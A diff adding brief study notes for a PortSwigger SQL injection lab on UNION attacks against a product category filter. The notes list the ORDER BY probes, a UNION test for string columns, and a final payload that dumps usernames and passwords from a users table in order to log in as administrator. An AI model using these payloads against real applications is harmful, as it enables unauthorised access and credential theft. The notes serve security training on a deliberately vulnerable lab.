@@ -1,0 +1,27 @@
+SQL Injection - Product category filter.
+
+End Goal: Output the usernames and passwords in the users table and login
+as the administrator user.
+
+Analysis:
+--------
+
+1> Determine # of columns that the vulnerable query is using
+' order by 1--
+' order by 2--
+' order by 3--
+
+total column=2
+
+2> Determine the data type of the columns
+
+select a,b from products where cateogry='Gifts
+' UNION select 'a', 'a'--
+-> both columns are of data type string
+
+' UNION select username, password from users--
+
+
+lab:--
+
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
